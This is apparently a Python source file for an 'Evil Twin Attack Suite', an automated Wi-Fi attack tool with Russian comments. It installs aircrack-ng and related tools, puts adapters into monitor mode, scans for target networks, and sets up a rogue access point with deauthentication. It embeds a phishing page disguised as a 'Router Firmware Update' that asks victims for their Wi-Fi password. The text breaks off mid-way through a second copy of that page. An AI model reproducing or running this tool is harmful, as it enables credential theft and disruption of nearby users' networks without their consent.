#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Evil Twin Attack Suite
Автоматизированный инструмент для Evil Twin атак
"""

import os
import sys
import time
import subprocess
import threading
import signal
from datetime import datetime
import curses
import json
import re
import argparse
import random

# Парсим аргументы командной строки
parser = argparse.ArgumentParser(description='Evil Twin Attack Suite')
parser.add_argument('--demo', action='store_true', help='Запустить в демо-режиме (без реальных атак)')
args = parser.parse_args()

DEMO_MODE = args.demo

# Цветовые схемы для терминала
class Colors:
    RESET = '\033[0m'
    RED = '\033[91m'
    WHITE = '\033[97m'
    ORANGE = '\033[38;5;208m'
    BRIGHT_ORANGE = '\033[38;5;214m'
    DARK_ORANGE = '\033[38;5;202m'
    BRIGHT_RED = '\033[1;91m'
    DARK_RED = '\033[31m'
    BOLD = '\033[1m'
    DIM = '\033[2m'
    
    # Claude-style оранжево-белые градиенты
    CLAUDE_COLORS = [
        '\033[38;5;208m',  # Оранжевый
        '\033[38;5;214m',  # Светло-оранжевый
        '\033[38;5;223m',  # Бежевый
        '\033[38;5;231m',  # Белый
    ]
    
    @staticmethod
    def gradient(text, reverse=False, style='red-white'):
        """Создает градиент"""
        if style == 'claude':
            colors = Colors.CLAUDE_COLORS
        else:
            colors = [
                '\033[38;5;196m',  # Яркий красный
                '\033[38;5;202m',  # Оранжево-красный
                '\033[38;5;208m',  # Оранжевый
                '\033[38;5;214m',  # Светло-оранжевый
                '\033[38;5;220m',  # Желтоватый
                '\033[38;5;226m',  # Светло-желтый
                '\033[38;5;231m',  # Белый
            ]
        
        if reverse:
            colors = colors[::-1]
        
        result = ""
        step = len(text) / len(colors) if len(text) > 0 else 1
        for i, char in enumerate(text):
            color_idx = min(int(i / step), len(colors) - 1)
            result += colors[color_idx] + char
        return result + Colors.RESET
    
    @staticmethod
    def animate_gradient(text, frame=0):
        """Анимированный переливающийся градиент"""
        colors = Colors.CLAUDE_COLORS
        result = ""
        for i, char in enumerate(text):
            color_idx = (i + frame) % len(colors)
            result += colors[color_idx] + char
        return result + Colors.RESET
    
    @staticmethod
    def rounded_box(width, height, title="", style='claude'):
        """Создает закругленную рамку с градиентом"""
        if style == 'claude':
            colors = Colors.CLAUDE_COLORS
        else:
            colors = ['\033[38;5;196m', '\033[38;5;208m', '\033[38;5;214m', 
                     '\033[38;5;220m', '\033[38;5;226m', '\033[38;5;231m']
        
        # Символы для закругленной рамки
        tl = '╭'  # top-left
        tr = '╮'  # top-right
        bl = '╰'  # bottom-left
        br = '╯'  # bottom-right
        h = '─'   # horizontal
        v = '│'   # vertical
        
        lines = []
        
        # Верхняя граница с заголовком
        if title:
            title_len = len(title)
            left_pad = (width - title_len - 2) // 2
            right_pad = width - title_len - left_pad - 2
            top = tl + h * left_pad + f' {title} ' + h * right_pad + tr
        else:
            top = tl + h * (width - 2) + tr
        
        # Применяем градиент к верхней границе
        colored_top = ""
        step = len(top) / len(colors)
        for i, char in enumerate(top):
            color_idx = min(int(i / step), len(colors) - 1)
            colored_top += colors[color_idx] + char
        lines.append(colored_top + Colors.RESET)
        
        # Боковые границы
        for i in range(height):
            left_idx = int((i / height) * len(colors)) % len(colors)
            right_idx = int(((i + 1) / height) * len(colors)) % len(colors)
            line = colors[left_idx] + v + Colors.RESET + ' ' * (width - 2) + colors[right_idx] + v + Colors.RESET
            lines.append(line)
        
        # Нижняя граница
        bottom = bl + h * (width - 2) + br
        colored_bottom = ""
        step = len(bottom) / len(colors)
        for i, char in enumerate(bottom):
            color_idx = min(int(i / step), len(colors) - 1)
            colored_bottom += colors[color_idx] + char
        lines.append(colored_bottom + Colors.RESET)
        
        return lines

# Глобальные переменные
REQUIRED_PACKAGES = [
    'aircrack-ng',      # Для airodump-ng, aireplay-ng, airmon-ng
    'hostapd',          # Для создания Evil Twin точки доступа
    'dnsmasq',          # DHCP и DNS сервер для клиентов
    'apache2',          # Веб-сервер для фишинговой страницы
    'php',              # PHP для обработки паролей
    'iptables',         # Правила firewall и NAT
    'wifite',           # Wifite для автоматических атак
    'net-tools',        # ifconfig, arp и другие сетевые утилиты
    'wireless-tools',   # iwconfig, iwlist
]

REQUIRED_PYTHON_PACKAGES = []

# Директория шаблонов рядом со скриптом
SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))
TEMPLATES_DIR = os.path.join(SCRIPT_DIR, 'templates')

# Глобальные флаги для управления атакой
stop_scan = False
attack_running = False
connected_clients = []
captured_passwords = []
deauth_log = []
ap_log = []

class TemplateManager:
    """Управление шаблонами фишинговых страниц"""
    
    @staticmethod
    def create_templates_dir():
        """Создание директории для шаблонов"""
        if not os.path.exists(TEMPLATES_DIR):
            os.makedirs(TEMPLATES_DIR)
            print(f"{Colors.WHITE}[+] Создана директория шаблонов: {TEMPLATES_DIR}{Colors.RESET}")
    
    @staticmethod
    def create_default_template():
        """Создание дефолтного шаблона"""
        default_html = """<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Router Firmware Update</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }
        .container {
            background: white;
            border-radius: 20px;
            padding: 40px;
            max-width: 400px;
            width: 100%;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
            animation: slideIn 0.5s ease-out;
        }
        @keyframes slideIn {
            from {
                opacity: 0;
                transform: translateY(-20px);
            }
            to {
                opacity: 1;
                transform: translateY(0);
            }
        }
        .logo {
            text-align: center;
            margin-bottom: 30px;
        }
        .logo svg {
            width: 60px;
            height: 60px;
            filter: drop-shadow(0 4px 6px rgba(0,0,0,0.1));
        }
        h1 {
            color: #333;
            font-size: 24px;
            margin-bottom: 10px;
            text-align: center;
            font-weight: 600;
        }
        .subtitle {
            color: #666;
            font-size: 14px;
            text-align: center;
            margin-bottom: 30px;
        }
        .warning {
            background: linear-gradient(135deg, #fff3cd 0%, #ffe8a1 100%);
            border-left: 4px solid #ffc107;
            padding: 15px;
            margin-bottom: 25px;
            border-radius: 8px;
            font-size: 14px;
            color: #856404;
            display: flex;
            align-items: center;
            gap: 10px;
        }
        .warning-icon {
            font-size: 20px;
            flex-shrink: 0;
        }
        .input-group {
            margin-bottom: 20px;
        }
        label {
            display: block;
            margin-bottom: 8px;
            color: #555;
            font-weight: 500;
            font-size: 14px;
        }
        input[type="password"] {
            width: 100%;
            padding: 12px 15px;
            border: 2px solid #e0e0e0;
            border-radius: 8px;
            font-size: 16px;
            transition: all 0.3s;
        }
        input[type="password"]:focus {
            outline: none;
            border-color: #667eea;
            box-shadow: 0 0 0 3px rgba(102, 126, 234, 0.1);
        }
        button {
            width: 100%;
            padding: 14px;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            border: none;
            border-radius: 8px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s;
            position: relative;
            overflow: hidden;
        }
        button:before {
            content: '';
            position: absolute;
            top: 0;
            left: -100%;
            width: 100%;
            height: 100%;
            background: rgba(255,255,255,0.2);
            transition: left 0.5s;
        }
        button:hover:before {
            left: 100%;
        }
        button:hover {
            transform: translateY(-2px);
            box-shadow: 0 10px 20px rgba(102, 126, 234, 0.4);
        }
        button:active {
            transform: translateY(0);
        }
        .footer {
            margin-top: 25px;
            text-align: center;
            font-size: 12px;
            color: #999;
        }
        .security-badge {
            display: inline-flex;
            align-items: center;
            gap: 5px;
            color: #4caf50;
            font-weight: 500;
        }
        .progress-bar {
            width: 100%;
            height: 4px;
            background: #f0f0f0;
            border-radius: 2px;
            margin-top: 20px;
            overflow: hidden;
        }
        .progress-fill {
            height: 100%;
            background: linear-gradient(90deg, #667eea 0%, #764ba2 100%);
            width: 0%;
            transition: width 0.3s;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">
            <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                <circle cx="12" cy="12" r="10" fill="#667eea" opacity="0.2"/>
                <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 18c-4.41 0-8-3.59-8-8s3.59-8 8-8 8 3.59 8 8-3.59 8-8 8z" fill="#667eea"/>
                <path d="M12 6c-3.31 0-6 2.69-6 6s2.69 6 6 6 6-2.69 6-6-2.69-6-6-6zm0 10c-2.21 0-4-1.79-4-4s1.79-4 4-4 4 1.79 4 4-1.79 4-4 4z" fill="#764ba2"/>
            </svg>
        </div>
        <h1>Firmware Update Required</h1>
        <p class="subtitle">A new security update is available</p>
        
        <div class="warning">
            <span class="warning-icon">⚠️</span>
            <div>
                <strong>Authentication Required</strong><br>
                Please verify your Wi-Fi password to continue
            </div>
        </div>
        
        <form action="verify.php" method="POST" onsubmit="showProgress()">
            <div class="input-group">
                <label for="password">Wi-Fi Password:</label>
                <input type="password" id="password" name="password" required placeholder="Enter your password" minlength="8">
            </div>
            <button type="submit">Verify & Continue</button>
            <div class="progress-bar" id="progress" style="display:none;">
                <div class="progress-fill" id="progressFill"></div>
            </div>
        </form>
        
        <div class="footer">
            <span class="security-badge">
                <svg width="16" height="16" viewBox="0 0 24 24" fill="none">
                    <path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4z" fill="#4caf50"/>
                </svg>
                Secure Connection
            </span>
        </div>
    </div>
    
    <script>
        function showProgress() {
            document.getElementById('progress').style.display = 'block';
            let width = 0;
            const interval = setInterval(() => {
                if (width >= 100) {
                    clearInterval(interval);
                } else {
                    width += 10;
                    document.getElementById('progressFill').style.width = width + '%';
                }
            }, 100);
        }
    </script>
</body>
</html>"""
        
        with open(f'{TEMPLATES_DIR}/default.html', 'w') as f:
            f.write(default_html)
        
        print(f"{Colors.WHITE}[+] Создан шаблон: default.html{Colors.RESET}")
    
    @staticmethod
    def list_templates():
        """Получить список доступных шаблонов"""
        if not os.path.exists(TEMPLATES_DIR):
            return []
        
        templates = []
        for file in os.listdir(TEMPLATES_DIR):
            if file.endswith('.html'):
                templates.append(file.replace('.html', ''))
        
        return templates
    
    @staticmethod
    def init_templates():
        """Инициализация системы шаблонов"""
        TemplateManager.create_templates_dir()
        
        # Создаем дефолтный шаблон если его нет
        if not os.path.exists(f'{TEMPLATES_DIR}/default.html'):
            TemplateManager.create_default_template()

class PackageManager:
    """Управление пакетами и зависимостями"""
    
    @staticmethod
    def check_package(package):
        """Проверка установлен ли пакет"""
        try:
            result = subprocess.run(['which', package], 
                                  capture_output=True, 
                                  text=True, 
                                  timeout=5)
            return result.returncode == 0
        except:
            return False
    
    @staticmethod
    def check_python_package(package):
        """Проверка установлен ли Python пакет"""
        try:
            __import__(package)
            return True
        except ImportError:
            return False
    
    @staticmethod
    def install_packages():
        """Установка недостающих пакетов"""
        print(f"\n{Colors.gradient('='*60, style='claude')}")
        print(f"{Colors.ORANGE}[*] Проверка зависимостей...{Colors.RESET}\n")
        
        missing_packages = []
        missing_python_packages = []
        
        # Проверка системных пакетов
        for package in REQUIRED_PACKAGES:
            # Для некоторых пакетов нужно проверять конкретные бинарники
            check_cmd = package
            if package == 'aircrack-ng':
                check_cmd = 'airmon-ng'
            elif package == 'wireless-tools':
                check_cmd = 'iwconfig'
            elif package == 'net-tools':
                check_cmd = 'ifconfig'
            
            status = "✓" if PackageManager.check_package(check_cmd) else "✗"
            color = Colors.WHITE if status == "✓" else Colors.ORANGE
            print(f"{color}[{status}] {package}{Colors.RESET}")
            if status == "✗":
                missing_packages.append(package)
        
        # Проверка Python пакетов
        for package in REQUIRED_PYTHON_PACKAGES:
            status = "✓" if PackageManager.check_python_package(package) else "✗"
            color = Colors.WHITE if status == "✓" else Colors.ORANGE
            print(f"{color}[{status}] python3-{package}{Colors.RESET}")
            if status == "✗":
                missing_python_packages.append(package)
        
        if missing_packages or missing_python_packages:
            print(f"\n{Colors.ORANGE}[!] Обнаружены недостающие пакеты!{Colors.RESET}")
            response = input(f"{Colors.WHITE}Установить? (y/n): {Colors.RESET}").lower()
            
            if response == 'y':
                # Обновление репозиториев
                print(f"\n{Colors.ORANGE}[*] Обновление списка пакетов...{Colors.RESET}")
                subprocess.run(['apt-get', 'update'], check=False)
                
                # Установка системных пакетов
                if missing_packages:
                    print(f"\n{Colors.ORANGE}[*] Установка системных пакетов...{Colors.RESET}")
                    subprocess.run(['apt-get', 'install', '-y'] + missing_packages, check=False)
                
                # Установка Python пакетов
                if missing_python_packages:
                    print(f"\n{Colors.ORANGE}[*] Установка Python пакетов...{Colors.RESET}")
                    for pkg in missing_python_packages:
                        subprocess.run([sys.executable, '-m', 'pip', 'install', pkg], check=False)
                
                print(f"\n{Colors.WHITE}[✓] Установка завершена!{Colors.RESET}")
                time.sleep(2)
            else:
                print(f"{Colors.ORANGE}[!] Установка отменена. Скрипт может работать некорректно.{Colors.RESET}")
                time.sleep(2)

class NetworkInterface:
    """Управление сетевыми интерфейсами"""
    
    @staticmethod
    def get_interfaces():
        """Получить список Wi-Fi интерфейсов"""
        if DEMO_MODE:
            # Возвращаем фейковые адаптеры в демо режиме
            return ['wlan0', 'wlan1']
        
        interfaces = []
        
        try:
            # Метод 1: iw dev (самый надёжный)
            result = subprocess.run(['iw', 'dev'], 
                                  capture_output=True, 
                                  text=True, 
                                  stderr=subprocess.DEVNULL,
                                  timeout=5)
            for line in result.stdout.split('\n'):
                if 'Interface' in line:
                    iface = line.strip().split()[-1]
                    if iface and iface not in interfaces:
                        interfaces.append(iface)
        except:
            pass
        
        # Метод 2: iwconfig
        if not interfaces:
            try:
                result = subprocess.run(['iwconfig'], 
                                      capture_output=True, 
                                      text=True, 
                                      stderr=subprocess.DEVNULL,
                                      timeout=5)
                for line in result.stdout.split('\n'):
                    # Берём первое слово если строка содержит беспроводные индикаторы
                    if 'IEEE 802.11' in line:
                        parts = line.strip().split()
                        if parts:
                            iface = parts[0]
                            if iface and iface not in interfaces and not iface.startswith('lo'):
                                interfaces.append(iface)
            except:
                pass
        
        # Метод 3: ip link (показывает все интерфейсы)
        if not interfaces:
            try:
                result = subprocess.run(['ip', 'link', 'show'], 
                                      capture_output=True, 
                                      text=True,
                                      timeout=5)
                for line in result.stdout.split('\n'):
                    # Ищем строки типа: "3: wlan0: <BROADCAST..."
                    if 'wlan' in line and '<' in line:
                        parts = line.split(':')
                        if len(parts) >= 2:
                            iface = parts[1].strip()
                            if iface and iface not in interfaces:
                                interfaces.append(iface)
            except:
                pass
        
        # Метод 4: /sys/class/net (файловая система)
        if not interfaces:
            try:
                net_path = '/sys/class/net'
                if os.path.exists(net_path):
                    for iface in os.listdir(net_path):
                        # Ищем интерфейсы похожие на Wi-Fi
                        if any(prefix in iface for prefix in ['wlan', 'wlp', 'wlx', 'mon']):
                            if iface not in interfaces:
                                interfaces.append(iface)
            except:
                pass
        
        return interfaces
    
    @staticmethod
    def is_monitor_mode(interface):
        """Проверка режима монитора"""
        if DEMO_MODE:
            # В демо режиме все адаптеры в Managed
            return False
        
        try:
            # Если интерфейс заканчивается на mon, это monitor mode
            if 'mon' in interface:
                return True
            
            # Проверяем через iwconfig
            result = subprocess.run(['iwconfig', interface], 
                                  capture_output=True, 
                                  text=True,
                                  stderr=subprocess.DEVNULL)
            return 'Mode:Monitor' in result.stdout
        except:
            return False
    
    @staticmethod
    def enable_monitor_mode(interface):
        """Включить режим монитора"""
        if DEMO_MODE:
            print(f"{Colors.ORANGE}[DEMO] Включение monitor mode на {interface}...{Colors.RESET}")
            time.sleep(1)
            return True
        
        try:
            # Проверяем и включаем интерфейс если он DOWN
            result = subprocess.run(['ip', 'link', 'show', interface],
                                  capture_output=True,
                                  text=True,
                                  timeout=5)
            
            if 'state DOWN' in result.stdout or 'DOWN' in result.stdout:
                print(f"{Colors.WHITE}[*] Interface {interface} is DOWN, bringing it UP...{Colors.RESET}")
                subprocess.run(['ip', 'link', 'set', interface, 'up'],
                             capture_output=True,
                             timeout=5)
                time.sleep(1)
            
            # Убиваем мешающие процессы
            print(f"{Colors.WHITE}[*] Killing interfering processes...{Colors.RESET}")
            subprocess.run(['airmon-ng', 'check', 'kill'], 
                         capture_output=True,
                         timeout=10)
            
            # Включаем monitor mode
            print(f"{Colors.WHITE}[*] Starting monitor mode on {interface}...{Colors.RESET}")
            result = subprocess.run(['airmon-ng', 'start', interface], 
                                  capture_output=True,
                                  text=True,
                                  timeout=10)
            
            # Показываем вывод для отладки
            if result.stdout:
                print(f"{Colors.DIM}{result.stdout}{Colors.RESET}")
            
            time.sleep(2)
            
            # Проверяем что monitor mode включился
            mon_interface = interface + 'mon'
            check_result = subprocess.run(['iwconfig', mon_interface],
                                        capture_output=True,
                                        text=True,
                                        stderr=subprocess.DEVNULL)
            
            if check_result.returncode == 0:
                print(f"{Colors.WHITE}[✓] Monitor mode enabled: {mon_interface}{Colors.RESET}")
                return True
            else:
                print(f"{Colors.ORANGE}[!] Warning: Could not verify monitor mode{Colors.RESET}")
                return True
            
        except Exception as e:
            print(f"{Colors.ORANGE}[!] Error enabling monitor mode: {e}{Colors.RESET}")
            return False
    
    @staticmethod
    def disable_monitor_mode(interface):
        """Выключить режим монитора"""
        if DEMO_MODE:
            print(f"{Colors.ORANGE}[DEMO] Выключение monitor mode на {interface}...{Colors.RESET}")
            time.sleep(1)
            return True
        
        try:
            # Пробуем через airmon-ng stop
            result = subprocess.run(['airmon-ng', 'stop', interface], 
                                  capture_output=True,
                                  text=True,
                                  timeout=10)
            
            # Если интерфейс имеет mon в имени, пробуем базовый интерфейс
            if 'mon' in interface:
                base_iface = interface.replace('mon', '')
                subprocess.run(['airmon-ng', 'stop', base_iface], 
                             capture_output=True,
                             timeout=10)
            
            # Перезапускаем NetworkManager
            subprocess.run(['systemctl', 'restart', 'NetworkManager'], 
                         capture_output=True,
                         timeout=10)
            
            time.sleep(2)
            return True
        except Exception as e:
            print(f"{Colors.ORANGE}[!] Error disabling monitor mode: {e}{Colors.RESET}")
            return False
    
    @staticmethod
    def disable_all_monitor_modes():
        """Выключить режим монитора на всех адаптерах"""
        print(f"\n{Colors.ORANGE}[*] Stopping monitor mode on all adapters...{Colors.RESET}\n")
        
        if DEMO_MODE:
            print(f"{Colors.ORANGE}[DEMO] All adapters set to Managed mode{Colors.RESET}")
            time.sleep(1)
            return
        
        try:
            # Способ 1: airmon-ng check kill (останавливает все мешающие процессы)
            print(f"{Colors.WHITE}[*] Killing interfering processes...{Colors.RESET}")
            subprocess.run(['airmon-ng', 'check', 'kill'], 
                         capture_output=True,
                         timeout=10)
            
            # Способ 2: Находим все mon интерфейсы и останавливаем их
            interfaces = NetworkInterface.get_interfaces()
            for iface in interfaces:
                if 'mon' in iface or NetworkInterface.is_monitor_mode(iface):
                    print(f"{Colors.WHITE}[*] Stopping {iface}...{Colors.RESET}")
                    subprocess.run(['airmon-ng', 'stop', iface], 
                                 capture_output=True,
                                 timeout=10)
                    time.sleep(1)
            
            # Способ 3: Запускаем wpa_supplicant
            print(f"{Colors.WHITE}[*] Starting wpa_supplicant...{Colors.RESET}")
            subprocess.run(['systemctl', 'start', 'wpa_supplicant'], 
                         capture_output=True,
                         timeout=10)
            
            # Способ 4: Перезапускаем NetworkManager
            print(f"{Colors.WHITE}[*] Restarting NetworkManager...{Colors.RESET}")
            subprocess.run(['systemctl', 'restart', 'NetworkManager'], 
                         capture_output=True,
                         timeout=10)
            
            time.sleep(2)
            print(f"{Colors.WHITE}[✓] Done! Network services restored.{Colors.RESET}")
            
        except Exception as e:
            print(f"{Colors.ORANGE}[!] Error: {e}{Colors.RESET}")

class APScanner:
    """Сканер точек доступа"""
    
    def __init__(self, interface):
        self.interface = interface
        self.networks = []
        self.process = None
        
    def scan(self):
        """Запуск сканирования"""
        global stop_scan
        stop_scan = False
        
        if DEMO_MODE:
            return self.demo_scan()
        
        print(f"\n{Colors.ORANGE}[*] Starting scan on {self.interface}...{Colors.RESET}")
        
        # Проверяем что интерфейс существует
        result = subprocess.run(['iwconfig', self.interface], 
                              capture_output=True, 
                              text=True,
                              stderr=subprocess.DEVNULL)
        
        if 'No such device' in result.stderr or result.returncode != 0:
            print(f"{Colors.ORANGE}[!] Interface {self.interface} not found!{Colors.RESET}")
            input(f"\n{Colors.WHITE}Press Enter to continue...{Colors.RESET}")
            return []
        
        # Создаем временный файл
        self.temp_file = f"/tmp/scan_{int(time.time())}"
        
        # Запускаем airodump-ng
        cmd = [
            'airodump-ng',
            '--write', self.temp_file,
            '--write-interval', '1',
            '--output-format', 'csv',
            self.interface
        ]
        
        print(f"{Colors.WHITE}[*] Running: {' '.join(cmd)}{Colors.RESET}")
        
        try:
            self.process = subprocess.Popen(
                cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE
            )
        except Exception as e:
            print(f"{Colors.ORANGE}[!] Failed to start airodump-ng: {e}{Colors.RESET}")
            input(f"\n{Colors.WHITE}Press Enter to continue...{Colors.RESET}")
            return []
        
        print(f"\n{Colors.ORANGE}[*] Scanning networks...{Colors.RESET}")
        print(f"{Colors.WHITE}[*] Press Ctrl+C to stop{Colors.RESET}\n")
        print(f"{Colors.gradient('-'*80, style='claude')}\n")
        print(f"{'№':>3} {'BSSID':^17} {'CH':^4} {'PWR':^5} {'ENC':^8} {'SSID':<32}")
        print(f"{Colors.gradient('-'*80, style='claude')}")
        
        scan_start = time.time()
        last_display = 0
        
        # Читаем результаты в реальном времени
        while not stop_scan:
            try:
                # Проверяем что процесс еще работает
                if self.process.poll() is not None:
                    # Процесс завершился
                    stderr = self.process.stderr.read().decode('utf-8', errors='ignore')
                    if stderr:
                        print(f"\n{Colors.ORANGE}[!] airodump-ng error:{Colors.RESET}")
                        print(f"{Colors.DIM}{stderr[:500]}{Colors.RESET}")
                    break
                
                csv_file = f"{self.temp_file}-01.csv"
                if os.path.exists(csv_file):
                    self.networks = self.parse_csv(csv_file)
                    
                    # Обновляем дисплей раз в секунду
                    if time.time() - last_display > 1:
                        self.display_networks()
                        last_display = time.time()
                
                # Если прошло 30 секунд и сетей нет - предупреждение
                if time.time() - scan_start > 30 and not self.networks:
                    print(f"\n{Colors.ORANGE}[!] No networks found yet. Make sure {self.interface} is in monitor mode.{Colors.RESET}")
                    print(f"{Colors.DIM}Try: sudo airmon-ng start <interface>{Colors.RESET}")
                
                time.sleep(0.5)
            except KeyboardInterrupt:
                stop_scan = True
                break
            except Exception as e:
                print(f"\n{Colors.ORANGE}[!] Scan error: {e}{Colors.RESET}")
                break
        
        # Останавливаем процесс
        if self.process:
            try:
                self.process.terminate()
                self.process.wait(timeout=5)
            except:
                self.process.kill()
        
        # Очищаем временные файлы
        try:
            for f in os.listdir('/tmp'):
                if f.startswith(os.path.basename(self.temp_file)):
                    try:
                        os.remove(os.path.join('/tmp', f))
                    except:
                        pass
        except:
            pass
        
        if not self.networks:
            print(f"\n{Colors.ORANGE}[!] No networks found{Colors.RESET}")
            print(f"{Colors.DIM}Possible reasons:{Colors.RESET}")
            print(f"{Colors.DIM}  - Interface not in monitor mode{Colors.RESET}")
            print(f"{Colors.DIM}  - No networks in range{Colors.RESET}")
            print(f"{Colors.DIM}  - Driver issues{Colors.RESET}")
        
        return self.networks
    
    def demo_scan(self):
        """Демо сканирование с фейковыми сетями"""
        print(f"\n{Colors.ORANGE}[DEMO] Сканирование сетей...{Colors.RESET}")
        print(f"{Colors.WHITE}[*] Нажмите Ctrl+B для остановки{Colors.RESET}\n")
        print(f"{Colors.gradient('-'*80, style='claude')}\n")
        print(f"{'№':>3} {'BSSID':^17} {'CH':^4} {'PWR':^5} {'ENC':^8} {'SSID':<32}")
        print(f"{Colors.gradient('-'*80, style='claude')}")
        
        # Фейковые сети для демо
        fake_networks = [
            {'bssid': 'AA:BB:CC:DD:EE:01', 'channel': '6', 'power': '-45', 'encryption': 'WPA2', 'ssid': 'TP-Link_Home'},
            {'bssid': 'AA:BB:CC:DD:EE:02', 'channel': '1', 'power': '-62', 'encryption': 'WPA2', 'ssid': 'NETGEAR_5G'},
            {'bssid': 'AA:BB:CC:DD:EE:03', 'channel': '11', 'power': '-58', 'encryption': 'WPA2', 'ssid': 'CoffeeShop_WiFi'},
            {'bssid': 'AA:BB:CC:DD:EE:04', 'channel': '6', 'power': '-71', 'encryption': 'WPA2', 'ssid': 'Guest_Network'},
            {'bssid': 'AA:BB:CC:DD:EE:05', 'channel': '3', 'power': '-80', 'encryption': 'WPA', 'ssid': 'OldRouter'},
        ]
        
        # Симуляция обнаружения сетей
        for i in range(5):
            if stop_scan:
                break
            
            if i < len(fake_networks):
                self.networks.append(fake_networks[i])
            
            self.display_networks()
            time.sleep(0.5)
        
        return self.networks
    
    def parse_csv(self, csv_file):
        """Парсинг CSV файла airodump-ng"""
        networks = []
        try:
            with open(csv_file, 'r', errors='ignore') as f:
                lines = f.readlines()
                
            in_ap_section = False
            for line in lines:
                if 'BSSID' in line and 'First time seen' in line:
                    in_ap_section = True
                    continue
                if 'Station MAC' in line:
                    break
                if in_ap_section and line.strip():
                    parts = line.split(',')
                    if len(parts) >= 14:
                        bssid = parts[0].strip()
                        channel = parts[3].strip()
                        power = parts[8].strip()
                        enc = parts[5].strip()
                        ssid = parts[13].strip()
                        
                        if bssid and bssid != '':
                            networks.append({
                                'bssid': bssid,
                                'channel': channel,
                                'power': power,
                                'encryption': enc,
                                'ssid': ssid if ssid else '<Hidden>'
                            })
        except:
            pass
        
        return networks
    
    def display_networks(self):
        """Отображение найденных сетей"""
        os.system('clear')
        print(f"\n{Colors.BRIGHT_RED}[*] Найдено сетей: {len(self.networks)}{Colors.RESET}")
        print(f"{Colors.WHITE}[*] Нажмите Ctrl+B для остановки{Colors.RESET}\n")
        print(f"{Colors.gradient('-'*80)}\n")
        print(f"{'№':>3} {'BSSID':^17} {'CH':^4} {'PWR':^5} {'ENC':^8} {'SSID':<32}")
        print(f"{Colors.gradient('-'*80)}")
        
        for i, net in enumerate(self.networks[:20], 1):  # Показываем топ 20
            color = Colors.WHITE if int(net['power']) > -70 else Colors.DIM
            print(f"{color}{i:>3} {net['bssid']:^17} {net['channel']:^4} "
                  f"{net['power']:^5} {net['encryption']:^8} {net['ssid']:<32}{Colors.RESET}")

class EvilTwinAttack:
    """Класс для Evil Twin атаки"""
    
    def __init__(self, ap_interface, deauth_interface, target):
        self.ap_interface = ap_interface
        self.deauth_interface = deauth_interface
        self.target = target
        self.clients = []
        self.deauth_thread = None
        self.verification_thread = None
        self.animation_frame = 0
        self.correct_password = None
        self.attack_successful = False
        
        # Статусы без эмодзи
        self.deauth_status = "Deauthenticating..."
        self.ap_status = "Starting..."
    
    def update_animation_frame(self):
        """Обновление кадра анимации"""
        self.animation_frame = (self.animation_frame + 1) % len(Colors.CLAUDE_COLORS)
        
    def create_html_portal(self, template_name='default'):
        """Создание HTML страницы для фишинга"""
        
        if DEMO_MODE:
            print(f"{Colors.ORANGE}[DEMO] Создание HTML портала из шаблона {template_name}...{Colors.RESET}")
            time.sleep(0.5)
            return
        
        # Загружаем шаблон
        template_path = f'{TEMPLATES_DIR}/{template_name}.html'
        
        if os.path.exists(template_path):
            with open(template_path, 'r') as f:
                html_content = f.read()
        else:
            # Дефолтный шаблон если файл не найден
            html_content = """<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Router Firmware Update</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }
        .container {
            background: white;
            border-radius: 20px;
            padding: 40px;
            max-width: 400px;
            width: 100%;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
            animation: slideIn 0.5s ease-out;
        }
        @keyframes slideIn {
            from {
                opacity: 0;
                transform: translateY(-20px);
            }
            to {
                opacity: 1;
                transform: translateY(0);
            }
        }
        .logo {
            text-align: center;
            margin-bottom: 30px;
        }
        .logo svg {
            width: 60px;
            height: 60px;
            filter: drop-shadow(0 4px 6px rgba(0,0,0,0.1));
        }
        h1 {
            color: #333;
            font-size: 24px;
            margin-bottom: 10px;
            text-align: center;
            font-weight: 600;
        }
        .subtitle {
            color: #666;
            font-size: 14px;
            text-align: center;
            margin-bottom: 30px;
        }
        .warning {
            background: linear-gradient(135deg, #fff3cd 0%, #ffe8a1 100%);
            border-left: 4px solid #ffc107;
            padding: 15px;
            margin-bottom: 25px;
            border-radius: 8px;
            font-size: 14px;
            color: #856404;
            display: flex;
            align-items: center;
            gap: 10px;
        }
        .warning-icon {
            font-size: 20px;
            flex-shrink: 0;
        }
        .input-group {
            margin-bottom: 20px;
        }
        label {
            display: block;
            margin-bottom: 8px;
            color: #555;
            font-weight: 500;
            font-size: 14px;
        }
        input[type="password"] {
            width: 100%;
            padding: 12px 15px;
            border: 2px solid #e0e0e0;
            border-radius: 8px;
            font-size: 16px;
            transition: all 0.3s;
        }
        input[type="password"]:focus {
            outline: none;
            border-color: #667eea;
            box-shadow: 0 0 0 3px rgba(102, 126, 234, 0.1);
        }
        button {
            width: 100%;
            padding: 14px;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            border: none;
            border-radius: 8px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s;
